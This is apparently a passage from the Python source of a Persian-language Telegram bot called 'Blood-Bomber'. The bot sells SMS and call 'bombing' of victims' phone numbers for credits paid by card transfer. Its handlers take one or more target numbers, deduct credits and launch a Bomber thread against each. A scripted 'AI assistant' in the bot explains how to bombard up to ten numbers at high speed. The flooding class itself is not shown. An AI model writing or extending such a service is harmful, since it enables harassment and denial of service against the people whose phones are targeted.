        "از منوی زیر برای شروع استفاده کنید:"
    )
    
    try:
        bot.send_photo(message.chat.id, PANEL_IMAGE_URL, caption=caption, reply_markup=get_main_menu(), parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, caption, reply_markup=get_main_menu(), parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_callback(call):
    user_id = str(call.from_user.id)
    if is_user_joined(user_id):
        bot.answer_callback_query(call.id, "✅ شما عضو شدید!", show_alert=True)
        cmd_start(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ شما هنوز عضو نشده‌اید!", show_alert=True)

# ==========================================
# 6. هندلرهای منو (Callback Queries)
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = str(call.from_user.id)
    user = get_user(user_id)
    
    if call.data == "menu_back":
        caption = "منوی اصلی:"
        try:
            bot.edit_message_media(types.InputMediaPhoto(PANEL_IMAGE_URL, caption=caption, parse_mode='Markdown'), call.message.chat.id, call.message.message_id, reply_markup=get_main_menu())
        except:
            bot.edit_message_text(caption, call.message.chat.id, call.message.message_id, reply_markup=get_main_menu(), parse_mode='Markdown')

    elif call.data == "menu_profile":
        plan_name = PLANS.get(user['plan'], {}).get('name', "رایگان")
        if user['plan'] == "free": plan_name = "🆓 رایگان"
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        text = (
            f"👤 **نام:** {user['name']}\n"
            f"🆔 **آیدی:** `{user_id}`\n"
            f"📅 **تاریخ:** `{current_time}`\n"
            f"👑 **نوع حساب:** **{plan_name}**\n"
            f"💰 **اعتبار:** **{user['credits']}**\n"
            f"👥 **دعوت‌ها:** **{user['invites']}**\n"
        )
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_buy":
        text = "**پلن‌های اعتبار:**\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for key, plan in PLANS.items():
            text += f"🔹 **{plan['name']}** | {plan['price']} تومان\n"
            markup.add(types.InlineKeyboardButton(f"خرید {plan['name']}", callback_data=f"buy_{key}"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("buy_"):
        plan_key = call.data.replace("buy_", "")
        plan = PLANS[plan_key]
        user_states[user_id] = {"selected_plan": plan_key}
        text = f"✅ پلن **{plan['name']}** انتخاب شد.\n\n💳 مبلغ **{plan['price']} تومان** را واریز کنید:\n`{CARD_NUMBER}`\n\n📸 سپس **عکس رسید** را بفرستید."
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_buy"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_bomb_free":
        user_states[user_id] = {"state": "waiting_for_phone", "service": "free"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_text(f"📞 **سرویس رایگان**:\nشماره را وارد کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_bomb_sub":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("💎 پایه (۳ شماره)", callback_data="sub_basic"),
            types.InlineKeyboardButton("🔥 حرفه‌ای (۵ شماره)", callback_data="sub_pro"),
            types.InlineKeyboardButton("👑 VIP (۱۰ شماره)", callback_data="sub_vip")
        )
        bot.edit_message_text("**نوع اشتراک خود را انتخاب کنید:**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("sub_"):
        sub_type = call.data.replace("sub_", "")
        user_states[user_id] = {"state": "waiting_for_phone", "service": sub_type}
        max_phones = SERVICE_CONFIG[sub_type]["max_phones"]
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_text(f"📞 **سرویس {SERVICE_CONFIG[sub_type]['name']}** (حداکثر {max_phones} شماره):\nشماره را وارد کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_ai":
        user_states[user_id] = {"state": "waiting_for_ai"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_text("🤖 **سلام! من دستیار هوش مصنوعی Blood-Bomber هستم.**\n\nسوال خود را درباره ربات بپرسید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_wheel":
        if time.time() - user['last_wheel_spin'] < WHEEL_COOLDOWN:
            bot.answer_callback_query(call.id, "⏳ امروز چرخانده‌اید!", show_alert=True)
        else:
            prize = random.choice([1, 2, 5, 10, 20, 50])
            user['credits'] += prize
            user['last_wheel_spin'] = time.time()
            save_user(**user)
            bot.answer_callback_query(call.id, f"🎉 {prize} اعتبار برنده شدید!", show_alert=True)

    elif call.data == "menu_daily":
        if time.time() - user['last_daily'] < 86400:
            bot.answer_callback_query(call.id, "⏳ امروز گرفته‌اید!", show_alert=True)
        else:
            user['credits'] += 2
            user['last_daily'] = time.time()
            save_user(**user)
            bot.answer_callback_query(call.id, "🎉 ۲ اعتبار رایگان!", show_alert=True)

    elif call.data == "menu_leaderboard":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT name, credits, user_id FROM users ORDER BY credits DESC LIMIT 5")
        rows = c.fetchall()
        conn.close()
        text = "**۵ کاربر برتر:**\n\n" + "".join([f"{i}. **{row[0]}** ➜ {row[1]} اعتبار\n" for i, row in enumerate(rows, 1)])
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_support":
        user_states[user_id] = {"state": "waiting_for_support"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_text("🎧 پیام خود را بنویسید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_gift":
        user_states[user_id] = {"state": "waiting_for_gift"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_text("🔑 کد هدیه:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    # ================= ادمین =================
    elif call.data == "admin_stats" and call.from_user.id == ADMIN_ID:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        c.execute("SELECT SUM(credits) FROM users")
        total_credits = c.fetchone()[0] or 0
        conn.close()
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"**آمار:**\n👥 کاربران: {total_users}\n💰 اعتبارها: {total_credits}", parse_mode='Markdown')

    elif call.data == "admin_bulk_charge" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "چند اعتبار به همه اضافه کنم؟ (عدد):")
        bot.register_next_step_handler(msg, process_bulk_charge)

    elif call.data == "admin_bulk_deduct" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "چند اعتبار از همه کم کنم؟ (عدد):")
        bot.register_next_step_handler(msg, process_bulk_deduct)

    elif call.data == "admin_gifts" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "فرمت: `CODE CREDITS`:")
        bot.register_next_step_handler(msg, process_make_gift)

    elif call.data == "admin_view_user" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "آیدی عددی کاربر:")
        bot.register_next_step_handler(msg, view_user_admin)

    elif call.data == "admin_backup" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'rb') as f:
                bot.send_document(ADMIN_ID, f)

    elif call.data.startswith("admin_approve_"):
        req_id = call.data.replace("admin_approve_", "")
        if req_id in pending_approvals:
            data = pending_approvals[req_id]
            uid, plan_key = data["user_id"], data["plan"]
            plan = PLANS[plan_key]
            user_data = get_user(uid)
            if user_data:
                user_data["credits"] += plan["credits"]
                user_data["plan"] = plan_key
                user_data["total_purchases"] += 1
                save_user(**user_data)
                bot.send_message(uid, f"**پرداخت تایید شد!**\n**{plan['credits']}** اعتبار اضافه شد.", parse_mode='Markdown')
            bot.edit_message_text(f"✅ تایید شد.", call.message.chat.id, call.message.message_id)
            del pending_approvals[req_id]

    elif call.data.startswith("admin_reject_"):
        req_id = call.data.replace("admin_reject_", "")
        if req_id in pending_approvals:
            uid = pending_approvals[req_id]["user_id"]
            bot.edit_message_text("❌ رد شد.", call.message.chat.id, call.message.message_id)
            bot.send_message(uid, "❌ رسید شما رد شد.")
            del pending_approvals[req_id]

# ==========================================
# 7. پنل ادمین
# ==========================================
@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 آمار کل", callback_data="admin_stats"),
        types.InlineKeyboardButton("📢 پیام همگانی", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("🎁 شارژ همگانی", callback_data="admin_bulk_charge"),
        types.InlineKeyboardButton("📉 کسر همگانی", callback_data="admin_bulk_deduct"),
        types.InlineKeyboardButton("🔑 ساخت کد هدیه", callback_data="admin_gifts"),
        types.InlineKeyboardButton("👤 مشاهده کاربر", callback_data="admin_view_user"),
        types.InlineKeyboardButton("💾 دریافت بکاپ", callback_data="admin_backup")
    )
    bot.reply_to(message, "**پنل مدیریت**", reply_markup=markup, parse_mode='Markdown')

# ==========================================
# 8. دریافت ورودی‌ها (شامل هوش مصنوعی)
# ==========================================
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = str(message.from_user.id)
    if "selected_plan" not in user_states.get(user_id, {}):
        bot.reply_to(message, "ابتدا از منو یک پلن انتخاب کنید.")
        return
    plan_key = user_states[user_id]["selected_plan"]
    plan = PLANS[plan_key]
    req_id = f"{user_id}_{int(time.time())}"
    pending_approvals[req_id] = {"user_id": user_id, "plan": plan_key}
    bot.reply_to(message, "✅ رسید دریافت شد. منتظر تایید باشید.")
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{req_id}"),
        types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{req_id}")
    )
    bot.send_message(ADMIN_ID, f"📩 **رسید:**\nکاربر: `{user_id}`\nپلن: **{plan['name']}**", reply_markup=markup, parse_mode='Markdown')
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    del user_states[user_id]

@bot.message_handler(func=lambda message: str(message.from_user.id) in user_states)
def process_text_inputs(message):
    user_id = str(message.from_user.id)
    state = user_states[user_id].get("state")
    service_type = user_states[user_id].get("service", "free")
    user = get_user(user_id)
    
    if message.text == "لغو":
        del user_states[user_id]
        bot.reply_to(message, "عملیات لغو شد.", reply_markup=get_main_menu())
        return
    
    if state == "waiting_for_support":
        bot.send_message(ADMIN_ID, f"🎧 پیام از `{user_id}`:\n\n{message.text}")
        bot.reply_to(message, "✅ پیام ارسال شد.")
        del user_states[user_id]

    elif state == "waiting_for_ai":
        del user_states[user_id]
        q = message.text.lower()
        answer = "متاسفم، پاسخ این سوال را نمی‌دانم. لطفاً با پشتیبانی در ارتباط باشید."
        
        if "خرید" in q or "اعتبار" in q:
            answer = "برای خرید اعتبار، از دکمه '💳 خرید اعتبار' استفاده کنید. پلن مورد نظر را انتخاب کرده و پس از واریز، رسید را ارسال کنید."
        elif "بمبر" in q or "ارسال" in q or "پیام" in q:
            answer = "برای اجرای بمبر، از دکمه‌های '🆓 اجرای رایگان' یا '💎 اجرای اشتراکی' استفاده کنید. سپس شماره هدف را وارد کنید."
        elif "vip" in q or "ویژه" in q:
            answer = "پلن VIP با ۱۰۰۰ اعتبار به شما امکان می‌دهد تا ۱۰ شماره را با سرعت بالا بمباران کنید. از دکمه '👑 پنل VIP' استفاده کنید."
        elif "دعوت" in q or "زیرمجموعه" in q:
            answer = "با دستور /invite لینک اختصاصی خود را دریافت کنید. هر نفر که با لینک شما وارد شود، ۵ اعتبار هدیه می‌گیرید."
        elif "شانس" in q or "گردونه" in q:
            answer = "هر ۲۴ ساعت یک بار می‌توانید گردونه شانس را بچرخانید و بین ۱ تا ۵۰ اعتبار برنده شوید."
        elif "جوین" in q or "عضویت" in q:
            answer = "برای استفاده از ربات باید در کانال‌های ما عضو شوید. پس از عضویت، دکمه '✅ عضو شدم' را بزنید."
            
        bot.reply_to(message, f"🤖 **پاسخ هوش مصنوعی:**\n\n{answer}", parse_mode='Markdown')

    elif state == "waiting_for_phone":
        phones = message.text.strip().replace(" ", "").split(",")
        max_phones = SERVICE_CONFIG.get(service_type, SERVICE_CONFIG["free"])["max_phones"]
        if len(phones) > max_phones:
            bot.reply_to(message, f"❌ حداکثر تعداد شماره برای این سرویس {max_phones} است.")
            return
        if any(len(p) < 10 or not p.isdigit() for p in phones):
            bot.reply_to(message, "❌ فرمت نامعتبر.")
            return
        
        if service_type == "free":
            today = datetime.now().strftime("%Y-%m-%d")
            if user['last_bomb_date'] != today:
                user['last_bomb_date'] = today
                user['daily_bomb_count'] = 0
            if user['daily_bomb_count'] + len(phones) > SERVICE_CONFIG["free"]["max_daily"]:
                bot.reply_to(message, "❌ سهمیه رایگان شما پر شده!")
                del user_states[user_id]
                return
            user['daily_bomb_count'] += len(phones)
        else:
            if user['credits'] < len(phones):
                bot.reply_to(message, "❌ اعتبار کافی ندارید!")
                del user_states[user_id]
                return
            user['credits'] -= len(phones)
            
        save_user(**user)
        del user_states[user_id]
        bot.reply_to(message, f"🚀 **شروع شد!** هدف: `{len(phones)}` شماره", parse_mode='Markdown')
        bomber = Bomber(",".join(phones), user_id, service_type)
        active_bombers[user_id] = bomber
        threading.Thread(target=bomber.start).start()

    elif state == "waiting_for_gift":
        code = message.text.strip().upper()
        del user_states[user_id]
        if code in active_gift_codes and active_gift_codes[code]["uses"] > 0:
            amount = active_gift_codes[code]["credits"]
            active_gift_codes[code]["uses"] -= 1
            user['credits'] += amount
            save_user(**user)
            bot.reply_to(message, f"{amount} اعتبار اضافه شد.")
        else:
            bot.reply_to(message, "❌ کد نامعتبر.")

# ==========================================
# 9. توابع کمکی
# ==========================================
def process_bulk_charge(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.strip())
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET credits = credits + ?", (amount,))
        conn.commit()
        conn.close()
        bot.send_message(ADMIN_ID, f"✅ شارژ انجام شد.")
    except: pass

def process_bulk_deduct(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.strip())
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET credits = MAX(0, credits - ?)", (amount,))
        conn.commit()
        conn.close()
        bot.send_message(ADMIN_ID, f"✅ کسر انجام شد.")
    except: pass

def process_make_gift(message):
    try:
        parts = message.text.split()
        active_gift_codes[parts[0].upper()] = {"uses": int(parts[1]), "credits": 5}
        bot.reply_to(message, f"✅ کد ساخته شد.")
    except: bot.reply_to(message, "❌ فرمت اشتباه.")

def view_user_admin(message):
    uid = message.text.strip()
    user = get_user(uid)
    if user:
        bot.reply_to(message, f"👤 {user['name']}\n👑 {user['plan']}\n💰 {user['credits']} اعتبار")
    else: bot.reply_to(message, "❌ کاربر یافت نشد.")

if __name__ == "__main__":
    try:
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), use_reloader=False), daemon=True).start()
        print("🤖 Blood-Bomber is running...")
        bot.infinity_polling()
    except Exception as e:
        traceback.print_exc()
